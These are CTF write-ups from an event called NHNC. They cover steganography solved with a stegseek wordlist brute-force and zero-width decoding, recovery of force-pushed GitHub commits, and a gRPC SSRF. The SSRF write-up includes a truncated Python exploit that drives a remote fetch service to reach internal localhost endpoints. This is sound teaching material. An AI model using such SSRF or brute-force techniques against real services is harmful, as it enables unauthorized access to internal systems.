## Challenge Overview

The "No Flag?" challenge presented participants with a seemingly innocuous JPEG image of a cat. The minimal description hinted at a steganography challenge, requiring a deep dive into the image's hidden data to uncover the flag.

---


## Task Brief

The objective was to extract the hidden flag from the provided `flag.jpg` image. This involved identifying the steganographic technique used and then applying the appropriate tools or scripts to reveal the embedded flag.

---


## Solve Process
Initial reconnaissance using `exiftool`, `strings`, and `binwalk` yielded no immediate results. Suspecting steganography, I proceeded with `stegseek`, a tool for brute-forcing Steghide-embedded data with a wordlist:

```bash
‚ùØ stegseek flag.jpg ~/Cyber/Wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "1313"
[i] Original filename: "flag.txt".
[i] Extracting to "flag.jpg.out".
```

stegseek successfully extracted flag.txt (saved as flag.jpg.out) using the passphrase "1313". The extracted file contained what appeared to be a YouTube URL:

```
‚ùØ cat flag.jpg.out
https://youtu.be/KLUeLae4y6k?t=11 
```

Initially, I spent a considerable amount of time investigating the linked YouTube video, assuming the flag might be hidden within the video itself (e.g., in captions, visual cues, or audio). However, the video proved to be an irrelevant distraction.

A teammate, however, noticed unusual, invisible characters (non-printable characters) at the end of the URL when viewed with cat -A. These were identified as Unicode zero-width characters (U+200C ZERO WIDTH NON-JOINER and U+200B ZERO WIDTH SPACE), strongly indicating zero-width character steganography.

```cat -A flag.jpg.out```

To decrypt this hidden data, I wrote a Python script that translated U+200C to a binary '0' and U+200B to a binary '1':

```
with open("flag.jpg.out", "rb") as f:
    data = f.read()

# Extract only the part after the YouTube URL
marker = b"https://youtu.be/KLUeLae4y6k?t=11"
index = data.find(marker)
invisible = data[index + len(marker):]

# Remove non-invisible characters (keep only 0x8b and 0x8c patterns)
bits = ""
i = 0
while i < len(invisible) - 2:
    if invisible[i] == 0xe2 and invisible[i+1] == 0x80:
        if invisible[i+2] == 0x8c:
            bits += '0'
        elif invisible[i+2] == 0x8b:
            bits += '1'
        i += 3
    else:
        i += 1

# Convert bits to ASCII
flag = ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))
print("‚úÖ Decoded flag:", flag)
```

Running the script revealed the flag:

```
‚ùØ python3 decode.py 
‚úÖ Decoded flag: NHNC{z3r0-w1dTh_5p4c3-->1_z3r0-W1dH_n0n-j01N3r-->0_c00l!!!!!!}
```

---


## The Verdict

This was an excellent multi-stage steganography challenge. It started with a common image steganography method (Steghide) requiring a passphrase, leading to a file that then employed a more subtle and less common technique: zero-width character steganography. The challenge effectively tested not only knowledge of steganography tools but also attention to detail and the ability to recognize unusual characters in text streams. The "uncomfortable and weird anime video" was a clever red herring, diverting attention from the actual hidden data.

The final flag was: 

`NHNC{z3r0-w1dTh_5p4c3-->1_z3r0-W1dH_n0n-j01N3r-->0_c00l!!!!!!}`

---


## üß© Summary

The "No Flag?" challenge was a two-part steganography puzzle. The first stage involved using stegseek with a wordlist to extract a hidden file from a JPEG image, revealing a YouTube URL. The second, more subtle stage, required recognizing zero-width Unicode characters appended to the URL, which encoded the final flag in binary. A custom Python script was then used to decode these invisible characters into the plaintext flag.

# gitgit Challenge

![Git Git Challenge](/dzif8ltvg/image/upload/v1751910716/CTF/nhnc/gitgit_vp4rfu.png){: width="400" height="400"}

## Challenge Overview

The "gitgit" challenge tasked us, as security researchers, with investigating a public GitHub repository (https://github.com/UmmItC/gitgit). We had insider information suggesting sensitive information or confidential content might be hidden within this public repo. Our goal was to recover these "important clues."

---

## Task Brief

The objective was to identify and extract the hidden sensitive information, which was the flag, from the provided GitHub repository, focusing on potential hidden content despite version control manipulations like force pushes.

---


## Solve Process

### Initial Attempts

My initial approach began with standard Git repository inspection:

1.  **Cloning the repository**: I first cloned `https://github.com/UmmItC/gitgit` to my local machine.
2.  **`git log` inspection**: I meticulously checked the `git log` output, including using commands like `git log -p` (patch view) and `git log -S NHNC -p` to search for the flag pattern ("NHNC"). These commands, along with checking out various commits (git checkout <commit_hash>), did not reveal the flag.
3.  **Application runtime analysis**: I also attempted to run the Next.js application locally and within Docker containers, after troubleshooting `npm` registry issues. My theory was the flag might be displayed via a CSS transformation or client-side JavaScript. This path, however, proved to be a significant **rabbit hole**, consuming considerable time without yielding any results.

### The Breakthrough: GitHub's Compare View

The key to solving this challenge wasn't in local Git forensics, but in a specific feature of the **GitHub platform itself**. My teammate discovered that GitHub's **"compare" view** could expose commits that were seemingly "overwritten" by a force-push.

The critical insight involved using the GitHub UI to compare specific commit SHAs. By navigating to a URL structured like `https://github.com/UmmItC/gitgit/compare/<old_commit_sha>...<new_commit_sha>`, we could observe all pushes, even those ostensibly removed from the main branch's history by a force push.

After inspecting various commit ranges and their associated changes, we located the flag in the diff between two particular commits.

The specific URL that revealed the flag was:
`https://github.com/UmmItC/gitgit/compare/d0fe54d3fccf7345555da3e791f5415e8875ac01...5dd233465d64bebed5b8755e5e081fe0653e0b9b`

The steps taken on GitHub to find this are illustrated below:

1. **Navigating to the Activity Bar**:

    ![gitgit activity bar](/dzif8ltvg/image/upload/v1751914416/CTF/nhnc/github.com_activity_UmmItC_NHNC-gitgit_gznjb7.png){: width="400" height="400"}

2. **Identifying relevant commits**:

    ![gitgit commits list](/dzif8ltvg/image/upload/v1751914529/CTF/nhnc/github.com_commits_UmmItC_NHNC-gitgit_1_rgqceo.png)
3. **Viewing the comparison**:

    ![gitgit flag value](/dzif8ltvg/image/upload/v1751914562/CTF/nhnc/github.com_flag_UmmItC_NHNC-gitgit_1_mywdlm.png)

The flag itself was found within the JavaScript code:
```javascript
const flag = 'NHNC{Don7_tH!NK_foRCe_PU$H3d_CAn_HElp_YoU_hiD3_mE$s@6e!!!!-_0}';
```

---

## The Verdict
This was an excellent challenge that highlighted a common misconception: `git force-push` doesn't always permanently erase history from hosted platforms like GitHub. While it rewrites a branch's local history, platforms often retain records of pushed objects in their activity logs and compare views, even if those commits are later orphaned by a force push. This challenge cleverly guided us to leverage platform-specific features beyond standard local Git commands, teaching a valuable lesson about data persistence in cloud-hosted repositories.

The final flag was: `NHNC{Don7_tH!NK_foRCe_PU$H3d_CAn_HElp_YoU_hiD3_mE$s@6e!!!!-_0}`

---


## üß© Summary

The "gitgit" challenge involved recovering a flag hidden in a GitHub repository. Standard local Git forensics proved insufficient. The solution required exploiting GitHub's "compare" view to inspect the diff between specific commits. This revealed content that was seemingly removed by a git force-push, ultimately leading to the hidden flag.

# Let's Cook Some Delicious Goose!

![Let's Cook Some Delicious Goose! Challenge](/dzif8ltvg/image/upload/v1751917178/CTF/nhnc/lets_cook_some_goose_nhnc.ic3dt3a.org_challenges_vyrxbe.png){: width="400" height="400"}

---


## Challenge Overview

The "Let's Cook Some Delicious Goose!" challenge was a **Web Forensic** task. We were presented with a scenario about a "run away goose" and instructed to "Analyze the packets." The challenge provided a compressed archive (`Cook_Goose.tar.xz`) containing a network capture (`Happy_Log.pcapng`), a gRPC interface definition (`fetch.proto`), and a Flask web service script (`flag.py`). A hint mentioned the file size was less than 150 MB.

---


## Task Brief

Our objective was to analyze the provided network capture and supporting files to uncover the hidden flag, presumably located within the "run away goose" application.

---


## ## Solve Process

### 1. Initial Reconnaissance and Artifact Extraction

First, I extracted the provided `Cook_Goose.tar.xz` archive. This yielded three key files:

* **`Happy_Log.pcapng`**: The primary network capture file.
* **`fetch.proto`**: A Protocol Buffers definition file for a gRPC service.
* **`flag.py`**: A Python script indicating a Flask web service.

The presence of `fetch.proto` immediately indicated **gRPC** was involved, hinting at potential **Server-Side Request Forgery (SSRF)** if we could control the URLs fetched by the service. The `flag.py` file suggested an internal Flask application might be the target.

### 2. PCAP Analysis with Wireshark

### Inspecting `Happy_Log.pcapng` in Wireshark

I opened `Happy_Log.pcapng` in **Wireshark** for deeper graphical analysis. My strategy involved:

- **Filtering for HTTP/2 traffic**: gRPC typically runs over HTTP/2.
- **Searching for gRPC service calls**:  
    I used the filter:  `http2.headers.path contains "FetchURL"`based on the `FetchService` and `FetchURL` RPC defined in `fetch.proto`.
- **Investigating internal requests**:  
    I looked for evidence of the gRPC service making requests to internal endpoints. Filtering for `tcp contains "localhost"` revealed interesting traffic.

---

### 2. Crucial Discovery from Packet #74076

Upon inspecting frames that matched `tcp contains "localhost"`, I found requests to:

- **URL**: `http://localhost:80/`  
- **Method**: `GET`  
- **Response**: `"Meow"`

This confirmed that the gRPC service was interacting with a hidden **Flask application** running internally on `localhost:80`. The `"Meow"` response hinted at a simple test endpoint.

---

### 3. Discovering the Public gRPC Endpoint

Within the **HTTP/2 Protocol** layer in Wireshark, I also discovered the **public-facing gRPC endpoint** being used for these requests:

[http://chal.78727867.xyz:6666/fetch.FetchService/FetchURL](http://chal.78727867.xyz:6666/fetch.FetchService/FetchURL)

This was the key piece: it meant we had a **public service capable of proxying arbitrary HTTP requests internally** ‚Äî a perfect **SSRF vector**.

---

### 4. Exploiting with gRPC and Python

With the internal Flask application identified and a public gRPC SSRF vector, the next step was to craft an exploit. Thanks to the provided flag.py source, we had a precise understanding of the Flask app's endpoints and logic:
- A `/token` endpoint (GET request) generates and returns a token.
- A `/flag` endpoint (POST request) requires a valid token in the form data to return the flag.
- The root path / returns "Meow", confirming the observation from the PCAP analysis.
- The token validation is time-based, allowing for a TOKEN_VALIDITY window (5 seconds).

#### Environment Setup
I set up my Python environment to interact with gRPC:

```bash
pip install grpcio grpcio-tools
python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. fetch.proto
```

This compiled the fetch.proto definition into Python stubs (fetch_pb2.py and fetch_pb2_grpc.py), allowing me to programmatically interact with the gRPC service.


### 5. Exploit Script Execution

I then wrote an exploit script to perform the SSRF:


1.  **Fetch Token**: Make an SSRF call via the public gRPC service to `http://localhost:80/token` to retrieve a valid token from the internal Flask app.
2.  **Request Flag**: Use the obtained token to make a `POST` request via the gRPC service to `http://localhost:80/flag`.

The script execution confirmed the logic, successfully fetching the token and then the flag:

```
‚ùØ python3 exploit.py
[*] Fetching token...
[*] Trying localhost:80/token
[+] Got token from port 80: b85af8b86303f5050ddbbdb37c395d27427fa3a750fcff5bdcd3f59ee95d3094
[+] Got token: b85af8b86303f5050ddbbdb37c395d27427fa3a750fcff5bdcd3f59ee95d3094
[*] Fetching flag...
[üéâ] FLAG: NHNC{YuMMyeeeE_GOOOd_ChAL_rIGHT}
```

The flag was successfully retrieved in the FetchResponse.content.


## The Verdict

This was an excellent Web Forensic challenge that combined network analysis with understanding gRPC and exploiting an SSRF vulnerability. The .pcapng file was crucial for discovering the internal Flask application and the public gRPC endpoint, while the .proto file enabled us to build a custom client for exploitation. The multi-stage nature of first obtaining a token and then using it to get the flag added a nice layer of complexity.

The final flag was: NHNC{YuMMyeeeE_GOOOd_ChAL_rIGHT}


## üß© Summary

The "Let's Cook Some Delicious Goose!" challenge involved analyzing a network capture (.pcapng) to uncover an SSRF vulnerability within a gRPC service. By inspecting HTTP/2 traffic in Wireshark, we identified a public gRPC endpoint that proxied requests to an internal Flask application running on localhost:80. We then used the provided .proto file to build a Python gRPC client, which facilitated two SSRF requests: one to retrieve a token from /token, and another to POST that token to /flag, ultimately yielding the hidden flag.


**exploit.py: Python script to exploit the gRPC SSRF. It fetches a token from localhost:80/token, then uses it to POST to localhost:80/flag to retrieve the flag.**:

```

        headers=headers
    )
    response = stub.FetchURL(req)
    return response.content

def main():
    # Connect to remote gRPC service
    channel = grpc.insecure_channel("chal.78727867.xyz:6666")
    stub = fetch_pb2_grpc.FetchServiceStub(channel)

    # Step 1: Fetch token
    print("[*] Fetching token...")
    for port in [80, 5000, 8080, 6666]:
        try:
            print(f"[*] Trying localhost:{port}/token")
            token = fetch_url(stub, f"http://localhost:{port}/token")
            print(f"[+] Got token from port {port}: {token}")
            break
        except Exception as e:
            print(f"[!] Failed on port {port}: {e}")
    else:
        print("[-] All ports failed")
        return

    print("[+] Got token:", token)

    # Step 2: Submit token to /flag
    print("[*] Fetching flag...")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    body = f"token={token}"
    flag = fetch_url(stub, "http://localhost:80/flag", method="POST", body=body, headers=headers)
    print("[üéâ] FLAG:", flag)

    main()
